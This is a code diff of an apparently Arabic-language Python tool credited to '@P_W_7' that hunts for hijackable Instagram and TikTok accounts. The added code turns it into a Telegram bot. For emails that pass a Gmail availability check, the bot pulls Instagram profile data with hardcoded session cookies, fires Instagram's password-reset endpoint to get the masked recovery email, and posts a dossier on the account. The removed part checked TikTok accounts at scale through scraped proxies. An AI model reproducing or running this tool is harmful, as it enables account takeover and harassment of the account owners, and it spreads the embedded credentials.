-			'checkConnection': 'youtube:671:0',
-			'checkedDomains': 'youtube',
-			'pstMsg': '1',
-		}
+					continue 
+				if 'good' in rr:
+				  zy1+=1
+				  os.system('cls'if os.name=='net'else'clear')
+				  print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
+				  user=email.split('@')[0]
+				  try:
+					  urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
+					  he = {
+	'accept': '*/*',
+	'accept-encoding': 'gzip, deflate, br',
+	'accept-language': 'ar',
+	'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
+	'origin': 'https://www.instagram.com',
+	'referer': 'https://www.instagram.com/',
+	'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
+	'sec-ch-ua-mobile': '?0',
+	'sec-ch-ua-platform': '"Windows"',
+	'sec-fetch-dest': 'empty',
+	'sec-fetch-mode': 'cors',
+	'sec-fetch-site': 'same-site',
+	'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
+	'x-asbd-id': '198387',
+	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
+	'x-ig-app-id': '936619743392459',
+	'x-ig-www-claim': '0',
+	}
 	
-						try:
-							rr = requests.post(url,headers=headers,data=data).text
-							#print(rr)
-						except:
-							print('')
-						if '"gf.uar",1,' in rr:
-							yas+=1
-							os.system('cls'if os.name=='net'else'clear')
-							zzod(email)
-							print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-						else:
-							os.system('cls'if os.name=='net'else'clear')
-							nod+=1
-							#print(zom)
-							print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-				elif '":{"is_registered":0' in rr:
-						os.system('cls'if os.name=='net'else'clear')
-						no+=1
-						print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
+					  re =requests.get(urlg, headers=he).json()
+					  io = re['data']['user']['biography']
+					  fol = re['data']['user']['edge_followed_by']['count']
+					  fos = re['data']['user']['edge_follow']['count']
+					  ido = re['data']['user']['id']
+					  nam = re['data']['user']['full_name']
+					  isp = re['data']['user']['is_private']
+					  op = re['data']['user']['edge_owner_to_timeline_media']['count']
+					  try:
+					  	ree = requests.get(f'https://o7aa.pythonanywhere.com/?id={ido}').json()
+					  	date = ree["date"]
+					  except:
+					  	date="No Date"
+					  url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
+					  he = {
+	'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
+	'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
+	'Cookie2': '$Version=1',
+	'Accept-Language': 'ar-EG, en-US',
+	'X-IG-Connection-Type': 'MOBILE(LTE)',
+	'X-IG-Capabilities': 'AQ==',
+	'Accept-Encoding': 'gzip',
+	}
+					  data = {
+	"user_id":ido,"device_id":str(uuid4()),
+	}
+					  try:
+					  	zaid = requests.post(url,headers=he, data=data).json()
+					  	rest = zaid["obfuscated_email"]
+					  except:
+					  	rest='No Rest'
+					  ff =f'''
+	🎖═══════════════════
+	🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
+	🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
+	🗞 𝐈𝐃 ﴾ {ido} ﴿
+	📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
+	🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
+	🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
+	📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
+	🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
+	🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
+	🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
+	🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
+	🎖═══════════════════
+	🤴 𝐁𝐘 ﴾ @P_W_7 ﴿'''
+					  key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
+				  except:
+				  	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{email}</strong>",parse_mode="html",reply_markup=key)					
 				else:
-					#print(rr)
-					os.system('clear')
-		except:
-			pass		
-			
-				
-#ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+					os.system('cls'if os.name=='net'else'clear')
+					xy+=1
+					print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
+			else:
+				n1+=1
+				os.system('cls'if os.name=='net'else'clear')
+				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
 
-def znm():
-	zom=f"""
-{S}{B}{B}Tools {E}[{S}P_W_7{E}] {B}Hit Accounts TikTok 
-{B}═════════════════════════════
-{S}1 - {F} Check From Followers 
-{S}2 - {F} Check From All User
-{S}3 - {F} Check From All User {E}->{S} Proxy
-{S}4 - {F} Check From Random
-{S}5 - {F} Check Random {E}-> {S}Proxy
-{B}═════════════════════════════
-"""
-	print(zom)
-	try:
-		i = int(input(S+'∆ - Write Numper Next : '))
-		print('\n')
-		print(f'{B}═════════════════════════════')
-		if i ==1:
-			zod()
-		elif i ==4:
-			zod2()
-		elif i ==5:
-			porx=[]
-			for za in range(30):
-				try:
-					pro = requests.get('https://gimmeproxy.com/api/getProxy')
-					if '"protocol"' in pro.text or '"ip"' in pro.text or '"port"' in pro.text:
-						proxy = str(pro.json()['curl'])
-						proto = str(pro.json()['protocol'])
-						if 'http' in proxy:
-							pro=proxy.split('http://')[1]
-							print(pro)
-							porx.append(pro)
-						else:
-							print('')
-					else:
-						print('')
-				except:
-					print('')
+			try:
+				if addd == addad:
+					key = types.InlineKeyboardMarkup()
+					bot.send_message(message.chat.id, f"<strong>لـقد انـتهى فـحص الـسته</strong>",parse_mode="html",reply_markup=key)
+					print('لقـد انتهاء فحص السته')
+			except:
+				pass
+
+def k2(message):
+	id = str(message.from_user.id)
+	tn=str(message.text)
+	if 'حذف' in tn:
+		os.system(f'rm -rf usernamezaid{id}.txt')
+		key = types.InlineKeyboardMarkup()
+		bot.send_message(message.chat.id, f"<strong>تـم حـذف لسـتاتـك القـديمه</strong>",parse_mode="html",reply_markup=key)
+	else:
+		key = types.InlineKeyboardMarkup()
+		bot.send_message(message.chat.id, f"<strong>لـقد أرسـلت الكـلمه بشـكل خطأ</strong>",parse_mode="html",reply_markup=key)
+	
 			
-			znoxy(porx)
-			
-		elif i ==2:
-			allus()
-		elif i ==3:
-			porx=[]
-			for za in range(35):
-				try:
-					pro = requests.get('https://gimmeproxy.com/api/getProxy')
-					if '"protocol"' in pro.text or '"ip"' in pro.text or '"port"' in pro.text:
-						proxy = str(pro.json()['curl'])
-						proto = str(pro.json()['protocol'])
-						if 'http' in proxy:
-							pro=proxy.split('http://')[1]
-							print(pro)
-							porx.append(pro)
-						else:
-							print('')
-					else:
-						print('')
-				except:
-					print('')
-			os.system('clear')
-			print(zom)
-			listproxy(porx)			
-			
-			
-		else:
-			znm()
-	except:
-		os.system('clear')
-		print(f'{S} Error Input :) ')
-znm()
+@bot.message_handler(commands=["info"])
+def inf(message):
+    global zzk
+    zzk+=1
+    zxu = datetime.datetime.now()
+    nm = message.from_user.first_name
+    id2 = message.from_user.id
+    userk = message.from_user.username
+    bio = bot.get_chat(message.from_user.id).bio
+    
+    ttg=f'''
+رتبتك هي عضو 🥰 
+ـــــــــــــــــــــــــــــــــــــــ
+اسم المستخدم : {nm}
+يوزر المستخدم : @{userk}
+ايدي المستخدم : {id2}
+رقم المستخدم  : {zzk}
+الوقت : {zxu}
+بايو المستخدم : {bio}
+ـــــــــــــــــــــــــــــــــــــــ
+ـ @P_W_7'''
+    key = types.InlineKeyboardMarkup()
+    bot.send_message(message.chat.id, f"<strong>{ttg}</strong>",parse_mode="html",reply_markup=key) 	
+
+
+while True :
+    try:
+        bot.infinity_polling()
+    except:
+        print('Error')
